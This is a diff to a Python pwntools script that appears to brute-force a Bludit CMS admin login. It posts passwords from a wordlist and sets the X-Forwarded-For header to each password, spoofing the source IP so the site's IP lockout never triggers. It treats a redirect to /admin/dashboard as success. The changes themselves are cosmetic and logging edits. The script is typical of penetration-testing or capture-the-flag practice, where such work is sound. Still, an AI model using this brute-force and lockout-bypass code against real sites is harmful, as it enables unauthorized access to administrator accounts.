@@ -26,9 +26,9 @@ from pwn import *
 start_time = time.time()
 
 def keyHandler(sig, frame):
-	print(colored("\n[!] Ctrl + C pressed. Program ended...\n", "red"))
-	print(f"Total elapsed time: {int(time.time() - start_time)} seconds")
-	sys.exit(1)
+  log.failure(colored("Ctrl + C pressed. Program ended...\n", "red"))
+  print(f"Total elapsed time: {int(time.time() - start_time)} seconds")
+  sys.exit(1)
 signal.signal(signal.SIGINT, keyHandler)
 
 def getOptions():
@@ -45,7 +45,7 @@ def getOptions():
     sys.exit(1)
   return options
 
-def banner():
+def showBanner():
   print("""
    ___  __             ________ 
   / _ )/ /__  ___  ___/ /  _/ /_
@@ -119,7 +119,7 @@ def bruteForce(url, username, passwords):
       headers = {
         'Referer': url+'login',
         'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
-        'X-Forwarded-For': password
+        'x-forwarded-for': password
       }
 
       post_request = session.post(
@@ -131,10 +131,12 @@ def bruteForce(url, username, passwords):
       process.status(f"Testing with the password: {password}")
       if 'location' in post_request.headers:
         if '/admin/dashboard' in post_request.headers['location']:
-          log.success(colored(f"Password found! Use '{username}:{password}' to login", "green"))
+          log.success(colored(f"Password found! Use '{username}:{password}' to login.", "green"))
+          print(f"Total elapsed time: {int(time.time() - start_time)} seconds")
           sys.exit(0)
       elif "has been blocked" in post_request.text:
-        log.failure(colored("IP address has been blocked. Try again in a few minutes", "red"))
+        log.failure(colored("IP address has been blocked. Try again in a few minutes.", "red"))
+        print(f"Total elapsed time: {int(time.time() - start_time)} seconds")
         sys.exit(1)
       else:
         pass
@@ -143,13 +145,11 @@ def bruteForce(url, username, passwords):
 
 def main():
   try:
-    banner()
     options = getOptions()
     passwords = prepareWordlist(options.wordlist)
     url = prepareURL(options.domain)
+    showBanner()
     bruteForce(url, options.username, passwords)
-    print(f"Total elapsed time: {int(time.time() - start_time)} seconds")
-    sys.exit(0)
   except Exception as e:
     log.error(str(e))
 
